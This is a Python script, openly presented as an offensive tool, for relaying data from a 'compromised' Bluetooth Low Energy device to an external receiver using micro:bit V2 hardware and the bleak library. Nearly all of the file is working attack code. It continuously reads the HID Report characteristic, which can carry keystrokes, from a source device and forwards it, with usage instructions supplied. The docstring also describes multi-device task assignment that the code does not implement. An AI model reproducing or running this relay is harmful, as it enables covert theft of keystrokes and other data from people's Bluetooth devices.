# microbit_ble_exfiltration_relay.py

"""
BLE Data Exfiltration via Signal Relay for micro:bit V2 (Multi-Device Support)

This script enables BLE data exfiltration by relaying data from a compromised BLE device to a remote receiver.
- Detects available micro:bit devices and assigns tasks dynamically
- Relays sensitive BLE signals to an external receiver (`--exfiltrate <source_mac> <receiver_mac>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Exfiltrate BLE data from a source device to a receiver:
   ```sh
   python microbit_ble_exfiltration_relay.py --exfiltrate AA:BB:CC:DD:EE:FF BB:CC:DD:EE:FF:AA
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Data Exfiltration Relay
async def ble_exfiltration_relay(source_mac, receiver_mac):
    """Relays BLE data from a compromised device to an external receiver."""
    print(f"[+] Exfiltrating BLE data from {source_mac} to {receiver_mac}...")
    async with BleakClient(source_mac) as source_client:
        async with BleakClient(receiver_mac) as receiver_client:
            while True:
                data = await source_client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                await receiver_client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", data)
                print(f"[+] Exfiltrated data: {data}")
                await asyncio.sleep(0.5)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Data Exfiltration via Signal Relay for micro:bit V2")
    parser.add_argument("--exfiltrate", nargs=2, metavar=("source_mac", "receiver_mac"), help="Exfiltrate BLE data from source to receiver")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.exfiltrate:
        loop.run_until_complete(ble_exfiltration_relay(args.exfiltrate[0], args.exfiltrate[1]))
